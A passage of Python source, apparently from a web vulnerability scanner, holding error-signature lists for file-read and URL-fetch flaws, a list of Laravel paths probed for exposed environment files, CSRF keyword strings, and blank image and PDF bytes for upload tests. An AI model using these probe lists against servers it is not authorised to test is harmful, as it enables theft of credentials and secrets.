        "FileNotFoundException:",
        "AccessDeniedException:",
        "IOException:",
        "Error: ENOENT: no such file or directory",
        "Error: EACCES: permission denied",
        "Error: EISDIR: illegal operation on a directory",
        "Error: EIO: i/o error"
    ]

    fetch_url_errors=[
        "Failed to fetch content from the URL",
        "Failed to open stream: No such file or directory",
        "Invalid URL",
        "ConnectionError: HTTPConnectionPool(host=",
        "ConnectionError: HTTPSConnectionPool(host=",
        "TimeoutError: HTTPSConnectionPool(host=",
        "TimeoutError: HTTPConnectionPool(host=",
        "Failed to establish a new connection",
        "getaddrinfo failed",
        "Connection timed out",
        "failed to open stream:",
        "Temporary failure in name resolution",
        "Timeout while trying to fetch",
        "Failed to open TCP connection",
        "execution expired",
        "Host not found",
        "Connection timed out",
        "getaddrinfo: No address associated with hostname",
        "Can't connect to",
        "Invalid URL",
        "Connection refused",
        "Connection timeout",
        "getaddrinfo ENOTFOUND",
        "connect ECONNREFUSED"
    ]

    env_paths=['/','/demo/','/turnero/Acceso/','/china-tickets/','/club/','/laravel-5.6/','/laravel/','/vendor/','/subdomains/program/html/','/test/laravel/','/test/']

    csrf_strings=['csrf', 'auth', 'token','xsrf','secret']


    files_upload={
    'png':b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01,\x00\x00\x00\xa8\x08\x03\x00\x00\x00m\xf5#=\x00\x00\x00\x03PLTE\xff\xff\xff\xa7\xc4\x1b\xc8\x00\x00\x00GIDATx\x9c\xed\xc1\x01\x01\x00\x00\x00\x82 \xff\xafnH@\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xef\x06\xc5\x88\x00\x01\xbd#C\xf7\x00\x00\x00\x00IEND\xaeB`\x82',
    'pdf':b'%PDF-1.6\r%\xe2\xe3\xcf\xd3\r\n24 0 obj\r<</Filter/FlateDecode/First 4/Length 216/N 1/Type/ObjStm>>stream\r\nh\xde<\x8fQK\xc30\x14\x85\xff\xca}[\x8b\xd8\xde\xa4$:\x19\x83i\x14\x14\xc42\xc5\xbd\xec%Kn5\x986\x92&\x9b?\xdfV\xc5\xd7s\x0f\xdf\xfd\xce\x12\x10V\xabz\x93\xd3{\x88\x85\xa2O\x1dSOC\x82\xd0\xc1C\x1e\x933\x04\xfb\xe2\xf6\x8bLN\xeeH\xf0\xd4us4]\xef\xfb\xde\xbdE\x9d\\\x18`KGG\xa7}Y\xd67\x91~"\xa5\x13\x15\xea\x8a#JlP2\x81\xb2i\xceQ,\x10\x17\x7f\xad\xe9\xdf\xc6\x86\x03\xb5\xcf\xa2\xb2\xde\xc3+\xc5q\x86\x89\x8aW\xbc\xac\x1f\x83\xfd\x870\x89\x17L0d\x9c\xb33\xbc\xfc\x85\xb41\xd8lh\xa2\x98\x18\x0e:\x81r\x93\xaf\xf7\x14AV8Y\xef\xdc`\xc3i\x9c\xb5^\\\xf2T\\{=|@\xab\xee@\x05\x93\xe7\x99\xe5z\xfd-\xc0\x00|\xaaP\xac\r\nendstream\rendobj\r25 0 obj\r<</Filter/FlateDecode/First 4/Length 49/N 1/Type/ObjStm>>stream\r\nh\xde\xb2P0P\xb0\xb1\xd1w\xce/\xcd+Q0\xd4\xf7\xceL)\x8e64\x02\n\x06\xc5\xea\x87T\x16\xa4\xea\x07$\xa6\xa7\x16\xdb\xd9\x01\x04\x18\x00\xdf\xfa\x0b\xad\r\nendstream\rendobj\r26 0 obj\r<</Filter/FlateDecode/First 9/Length 42/N 2/Type/ObjStm>>stream\r\nh\xde2S0P0W0\xb4P\xb0\xb1\xd1\xf7+\xcd-\x8e\x06q\r\x14\x82b\xed\xec\x80"\xc1\xfa.vv\x00\x01\x06\x00\x8d\x85\x087\r\nendstream\rendobj\r27 0 obj\r<</Filter/FlateDecode/First 5/Length 120/N 1/Type/ObjStm>>stream\r\nh\xde24R0P\xb0\xb1\xd1w\xce\xcf+I\xcd+)V02\x06\n\x04\xe9;\x17\xe5\x178\xe5WD\x1b\x00yf\x86F\n\xe6\x96F\xb1\xfa\xbe\xa9)\x99\x89\x18\xa2\x01\x89E@\x9d\n\x16`}A\xa9\xc5\xf9\xa5E\xc9\xa9\xc5@3\x03\x8a\xf2\x93\x83SK\xa2\xf5\x03\\\xdc\xf4CR+Jb\xed\xec\xf4\x83\xf2K\x12KR\x15\x0c\xf4C*\x0bR\x81z\xd3S\xed\xec\x00\x02\x0c\x00\xd8\xa0\'\x96\r\nendstream\rendobj\r2 0 obj\r<</Length 3525/Subtype/XML/Type/Metadata>>stream\r\n<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>\n<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.4-c005 78.147326, 2012/08/23-13:03:03        ">\n   <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n      <rdf:Description rdf:about=""\n            xmlns:pdf="http://ns.adobe.com/pdf/1.3/"\n            xmlns:xmp="http://ns.adobe.com/xap/1.0/"\n            xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/"\n            xmlns:dc="http://purl.org/dc/elements/1.1/">\n         <pdf:Producer>Acrobat Distiller 6.0 (Windows)</pdf:Producer>\n         <xmp:CreateDate>2006-03-06T15:06:33-05:00</xmp:CreateDate>\n         <xmp:CreatorTool>AdobePS5.dll Version 5.2.2</xmp:CreatorTool>\n         <xmp:ModifyDate>2016-07-15T10:12:21+08:00</xmp:ModifyDate>\n         <xmp:MetadataDate>2016-07-15T10:12:21+08:00</xmp:MetadataDate>\n         <xmpMM:DocumentID>uuid:ff3dcfd1-23fa-476f-839a-3e5cae2da2eb</xmpMM:DocumentID>\n         <xmpMM:InstanceID>uuid:359350b3-af40-4d8a-9d6c-03186b4ffb36</xmpMM:InstanceID>\n         <dc:format>application/pdf</dc:format>\n         <dc:title>\n            <rdf:Alt>\n               <rdf:li xml:lang="x-default">Blank PDF Document</rdf:li>\n            </rdf:Alt>\n         </dc:title>\n         <dc:creator>\n            <rdf:Seq>\n               <rdf:li>Department of Justice (Executive Office of Immigration Review)</rdf:li>\n            </rdf:Seq>\n         </dc:creator>\n      </rdf:Description>\n   </rdf:RDF>\n</x:xmpmeta>\n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                           \n<?xpacket end="w"?>\r\nendstream\rendobj\r11 0 obj\r<</Metadata 2 0 R/PageLabels 6 0 R/Pages 8 0 R/Type/Catalog>>\rendobj\r23 0 obj\r<</Filter/FlateDecode/Length 10>>stream\r\nH\x89\x02\x080\x00\x00\x00\x00\x01\r\nendstream\rendobj\r28 0 obj\r<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<DB7775CCE227F6B30C440DF4221DC390><BFCCCF3F57F6134ABD3C04A9E4CA106E>]/Info 9 0 R/Length 80/Root 11 0 R/Size 29/Type/XRef/W[1 2 1]>>stream\r\nh\xdebb\x00\x02&0\xc1\xc8l\xc8\xc0\xf4\xff\xefy(\x17L01H\x81Y\x8c@\xe2\xff\x7f\x10\xc1\xc0\xf4\x8f\xe1\x05P\xb1\xa03\x90x\x7f\x03\xc4}\x8a\xac\x83\x08\x82Qp"\x90\xf5\xbe\x1eH0\x9a\x81\xc4\xfa@\xacv \xc1\xdf\xca\x00\x10`\x00\xff\x1b\x10-\r\nendstream\rendobj\rstartxref\r\n4576\r\n%%EOF\r\n',
    'jpg':b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x02\x01\x01,\x01,\x00\x00\xff\xed\x06\x82Photoshop 3.0\x008BIM\x03\xed\nResolution\x00\x00\x00\x00\x10\x01,\x00\x00\x00\x01\x00\x01\x01,\x00\x00\x00\x01\x00\x018BIM\x04\r\x18FX Global Lighting Angle\x00\x00\x00\x00\x04\x00\x00\x00\x1e8BIM\x04\x19\x12FX Global Altitude\x00\x00\x00\x00\x04\x00\x00\x00\x1e8BIM\x03\xf3\x0bPrint Flags\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\x00\x01\x008BIM\x04\n\x0eCopyright Flag\x00\x00\x00\x00\x01\x00\x008BIM\'\x10\x14Japanese Print Flags\x00\x00\x00\x00\n\x00\x01\x00\x00\x00\x00\x00\x00\x00\x028BIM\x03\xf5\x17Color Halftone Settings\x00\x00\x00H\x00/ff\x00\x01\x00lff\x00\x06\x00\x00\x00\x00\x00\x01\x00/ff\x00\x01\x00\xa1\x99\x9a\x00\x06\x00\x00\x00\x00\x00\x01\x002\x00\x00\x00\x01\x00Z\x00\x00\x00\x06\x00\x00\x00\x00\x00\x01\x005\x00\x00\x00\x01\x00-\x00\x00\x00\x06\x00\x00\x00\x00\x00\x018BIM\x03\xf8\x17Color Transfer Settings\x00\x00\x00p\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\xe8\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\xe8\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\xe8\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\xe8\x00\x008BIM\x04\x08\x06Guides\x00\x00\x00\x00\x10\x00\x00\x00\x01\x00\x00\x02@\x00\x00\x02@\x00\x00\x00\x008BIM\x04\x1e\rURL overrides\x00\x00\x00\x04\x00\x00\x00\x008BIM\x04\x1a\x06Slices\x00\x00\x00\x00i\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x96\x00\x00\x00\xed\x00\x00\x00\x04\x00C\x00C\x00B\x002\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xed\x00\x00\x00\x96\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008BIM\x04\x11\x11ICC Untagged Flag\x00\x00\x00\x01\x01\x008BIM\x04\x14\x17Layer ID Generator Base\x00\x00\x00\x04\x00\x00\x00\x018BIM\x04\x0c\x15New Windows Thumbnail\x00\x00\x02\xe5\x00\x00\x00\x01\x00\x00\x00p\x00\x00\x00G\x00\x00\x01P\x00\x00]0\x00\x00\x02\xc9\x00\x18\x00\x01\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x02\x01\x00H\x00H\x00\x00\xff\xee\x00\x0eAdobe\x00d\x80\x00\x00\x00\x01\xff\xdb\x00\x84\x00\x0c\x08\x08\x08\t\x08\x0c\t\t\x0c\x11\x0b\n\x0b\x11\x15\x0f\x0c\x0c\x0f\x15\x18\x13\x13\x15\x13\x13\x18\x11\x0c\x0c\x0c\x0c\x0c\x0c\x11\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x01\r\x0b\x0b\r\x0e\r\x10\x0e\x0e\x10\x14\x0e\x0e\x0e\x14\x14\x0e\x0e\x0e\x0e\x14\x11\x0c\x0c\x0c\x0c\x0c\x11\x11\x0c\x0c\x0c\x0c\x0c\x0c\x11\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\xff\xc0\x00\x11\x08\x00G\x00p\x03\x01"\x00\x02\x11\x01\x03\x11\x01\xff\xdd\x00\x04\x00\x07\xff\xc4\x01?\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x01\x02\x04\x05\x06\x07\x08\t\n\x0b\x01\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x10\x00\x01\x04\x01\x03\x02\x04\x02\x05\x07\x06\x08\x05\x03\x0c3\x01\x00\x02\x11\x03\x04!\x121\x05AQa\x13"q\x812\x06\x14\x91\xa1\xb1B#$\x15R\xc1b34r\x82\xd1C\x07%\x92S\xf0\xe1\xf1cs5\x16\xa2\xb2\x83&D\x93TdE\xc2\xa3t6\x17\xd2U\xe2e\xf2\xb3\x84\xc3\xd3u\xe3\xf3F\'\x94\xa4\x85\xb4\x95\xc4\xd4\xe4\xf4\xa5\xb5\xc5\xd5\xe5\xf5Vfv\x86\x96\xa6\xb6\xc6\xd6\xe6\xf67GWgw\x87\x97\xa7\xb7\xc7\xd7\xe7\xf7\x11\x00\x02\x02\x01\x02\x04\x04\x03\x04\x05\x06\x07\x07\x06\x055\x01\x00\x02\x11\x03!1\x12\x04AQaq"\x13\x052\x81\x91\x14\xa1\xb1B#\xc1R\xd1\xf03$b\xe1r\x82\x92CS\x15cs4\xf1%\x06\x16\xa2\xb2\x83\x07&5\xc2\xd2D\x93T\xa3\x17dEU6te\xe2\xf2\xb3\x84\xc3\xd3u\xe3\xf3F\x94\xa4\x85\xb4\x95\xc4\xd4\xe4\xf4\xa5\xb5\xc5\xd5\xe5\xf5Vfv\x86\x96\xa6\xb6\xc6\xd6\xe6\xf6\'7GWgw\x87\x97\xa7\xb7\xc7\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00?\x00\xf5T\x92I%)$\x92IJI$\x92R\x92I$\x94\xa4\x92I%)$\x92IJI$\x92S\xff\xd0\xf5T\x92I%)$\x92IJI$\x92R\x92I$\x94\xa4\x92I%)$\x92IJI$\x92S\xff\xd1\xf5T\x92I%)$\x92IJI$\x92R\x92I$\x94\xa4\x92I%)$\x92IJI$\x92S\xff\xd2\xf5T\x92I%)$\x92IJI$\x92R\x92I$\x94\xa4\x92I%)$\x92IJI$\x92S\xff\xd3\xf5T\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xff\xd9\x008BIM\x04!\x1aVersion compatibility info\x00\x00\x00\x00U\x00\x00\x00\x01\x01\x00\x00\x00\x0f\x00A\x00d\x00o\x00b\x00e\x00 \x00P\x00h\x00o\x00t\x00o\x00s\x00h\x00o\x00p\x00\x00\x00\x13\x00A\x00d\x00o\x00b\x00e\x00 \x00P\x00h\x00o\x00t\x00o\x00s\x00h\x00o\x00p\x00 \x006\x00.\x000\x00\x00\x00\x01\x008BIM\x04\x06\x0cJPEG Quality\x00\x00\x00\x00\x07\x00\x08\x01\x01\x00\x01\x01\x00\xff\xee\x00!Adobe\x00d@\x00\x00\x00\x01\x03\x00\x10\x03\x02\x03\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xdb\x00\x84\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x02\x02\x01\x02\x02\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\xff\xc2\x00\x11\x08\x00\x96\x00\xed\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00]\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x12\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\xff\xda\x00\x0c\x03\x01\x01\x02\x11\x03\x11\x00\x00\x00\xbf\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7f\xff\xda\x00\x08\x01\x02\x00\x01\x05\x00\x0e\xbf\xff\xda\x00\x08\x01\x03\x00\x01\x05\x00\x0e\xbf\xff\xda\x00\x08\x01\x01\x00\x01\x05\x00\x0e\xbf\xff\xda\x00\x08\x01\x02\x02\x06?\x00\x0e\xbf\xff\xda\x00\x08\x01\x03\x02\x06?\x00\x0e\xbf\xff\xda\x00\x08\x01\x01\x01\x06?\x00\x0e\xbf\xff\xd9',
    'jpeg':b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x02\x01\x01,\x01,\x00\x00\xff\xed\x06\x82Photoshop 3.0\x008BIM\x03\xed\nResolution\x00\x00\x00\x00\x10\x01,\x00\x00\x00\x01\x00\x01\x01,\x00\x00\x00\x01\x00\x018BIM\x04\r\x18FX Global Lighting Angle\x00\x00\x00\x00\x04\x00\x00\x00\x1e8BIM\x04\x19\x12FX Global Altitude\x00\x00\x00\x00\x04\x00\x00\x00\x1e8BIM\x03\xf3\x0bPrint Flags\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\x00\x01\x008BIM\x04\n\x0eCopyright Flag\x00\x00\x00\x00\x01\x00\x008BIM\'\x10\x14Japanese Print Flags\x00\x00\x00\x00\n\x00\x01\x00\x00\x00\x00\x00\x00\x00\x028BIM\x03\xf5\x17Color Halftone Settings\x00\x00\x00H\x00/ff\x00\x01\x00lff\x00\x06\x00\x00\x00\x00\x00\x01\x00/ff\x00\x01\x00\xa1\x99\x9a\x00\x06\x00\x00\x00\x00\x00\x01\x002\x00\x00\x00\x01\x00Z\x00\x00\x00\x06\x00\x00\x00\x00\x00\x01\x005\x00\x00\x00\x01\x00-\x00\x00\x00\x06\x00\x00\x00\x00\x00\x018BIM\x03\xf8\x17Color Transfer Settings\x00\x00\x00p\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\xe8\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\xe8\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\xe8\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\xe8\x00\x008BIM\x04\x08\x06Guides\x00\x00\x00\x00\x10\x00\x00\x00\x01\x00\x00\x02@\x00\x00\x02@\x00\x00\x00\x008BIM\x04\x1e\rURL overrides\x00\x00\x00\x04\x00\x00\x00\x008BIM\x04\x1a\x06Slices\x00\x00\x00\x00i\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x96\x00\x00\x00\xed\x00\x00\x00\x04\x00C\x00C\x00B\x002\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xed\x00\x00\x00\x96\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008BIM\x04\x11\x11ICC Untagged Flag\x00\x00\x00\x01\x01\x008BIM\x04\x14\x17Layer ID Generator Base\x00\x00\x00\x04\x00\x00\x00\x018BIM\x04\x0c\x15New Windows Thumbnail\x00\x00\x02\xe5\x00\x00\x00\x01\x00\x00\x00p\x00\x00\x00G\x00\x00\x01P\x00\x00]0\x00\x00\x02\xc9\x00\x18\x00\x01\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x02\x01\x00H\x00H\x00\x00\xff\xee\x00\x0eAdobe\x00d\x80\x00\x00\x00\x01\xff\xdb\x00\x84\x00\x0c\x08\x08\x08\t\x08\x0c\t\t\x0c\x11\x0b\n\x0b\x11\x15\x0f\x0c\x0c\x0f\x15\x18\x13\x13\x15\x13\x13\x18\x11\x0c\x0c\x0c\x0c\x0c\x0c\x11\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x01\r\x0b\x0b\r\x0e\r\x10\x0e\x0e\x10\x14\x0e\x0e\x0e\x14\x14\x0e\x0e\x0e\x0e\x14\x11\x0c\x0c\x0c\x0c\x0c\x11\x11\x0c\x0c\x0c\x0c\x0c\x0c\x11\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\xff\xc0\x00\x11\x08\x00G\x00p\x03\x01"\x00\x02\x11\x01\x03\x11\x01\xff\xdd\x00\x04\x00\x07\xff\xc4\x01?\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x01\x02\x04\x05\x06\x07\x08\t\n\x0b\x01\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x10\x00\x01\x04\x01\x03\x02\x04\x02\x05\x07\x06\x08\x05\x03\x0c3\x01\x00\x02\x11\x03\x04!\x121\x05AQa\x13"q\x812\x06\x14\x91\xa1\xb1B#$\x15R\xc1b34r\x82\xd1C\x07%\x92S\xf0\xe1\xf1cs5\x16\xa2\xb2\x83&D\x93TdE\xc2\xa3t6\x17\xd2U\xe2e\xf2\xb3\x84\xc3\xd3u\xe3\xf3F\'\x94\xa4\x85\xb4\x95\xc4\xd4\xe4\xf4\xa5\xb5\xc5\xd5\xe5\xf5Vfv\x86\x96\xa6\xb6\xc6\xd6\xe6\xf67GWgw\x87\x97\xa7\xb7\xc7\xd7\xe7\xf7\x11\x00\x02\x02\x01\x02\x04\x04\x03\x04\x05\x06\x07\x07\x06\x055\x01\x00\x02\x11\x03!1\x12\x04AQaq"\x13\x052\x81\x91\x14\xa1\xb1B#\xc1R\xd1\xf03$b\xe1r\x82\x92CS\x15cs4\xf1%\x06\x16\xa2\xb2\x83\x07&5\xc2\xd2D\x93T\xa3\x17dEU6te\xe2\xf2\xb3\x84\xc3\xd3u\xe3\xf3F\x94\xa4\x85\xb4\x95\xc4\xd4\xe4\xf4\xa5\xb5\xc5\xd5\xe5\xf5Vfv\x86\x96\xa6\xb6\xc6\xd6\xe6\xf6\'7GWgw\x87\x97\xa7\xb7\xc7\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00?\x00\xf5T\x92I%)$\x92IJI$\x92R\x92I$\x94\xa4\x92I%)$\x92IJI$\x92S\xff\xd0\xf5T\x92I%)$\x92IJI$\x92R\x92I$\x94\xa4\x92I%)$\x92IJI$\x92S\xff\xd1\xf5T\x92I%)$\x92IJI$\x92R\x92I$\x94\xa4\x92I%)$\x92IJI$\x92S\xff\xd2\xf5T\x92I%)$\x92IJI$\x92R\x92I$\x94\xa4\x92I%)$\x92IJI$\x92S\xff\xd3\xf5T\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xea\xa4\x97\xca\xa9$\xa7\xff\xd9\x008BIM\x04!\x1aVersion compatibility info\x00\x00\x00\x00U\x00\x00\x00\x01\x01\x00\x00\x00\x0f\x00A\x00d\x00o\x00b\x00e\x00 \x00P\x00h\x00o\x00t\x00o\x00s\x00h\x00o\x00p\x00\x00\x00\x13\x00A\x00d\x00o\x00b\x00e\x00 \x00P\x00h\x00o\x00t\x00o\x00s\x00h\x00o\x00p\x00 \x006\x00.\x000\x00\x00\x00\x01\x008BIM\x04\x06\x0cJPEG Quality\x00\x00\x00\x00\x07\x00\x08\x01\x01\x00\x01\x01\x00\xff\xee\x00!Adobe\x00d@\x00\x00\x00\x01\x03\x00\x10\x03\x02\x03\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xdb\x00\x84\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x02\x02\x01\x02\x02\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\xff\xc2\x00\x11\x08\x00\x96\x00\xed\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00]\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x12\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\xff\xda\x00\x0c\x03\x01\x01\x02\x11\x03\x11\x00\x00\x00\xbf\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00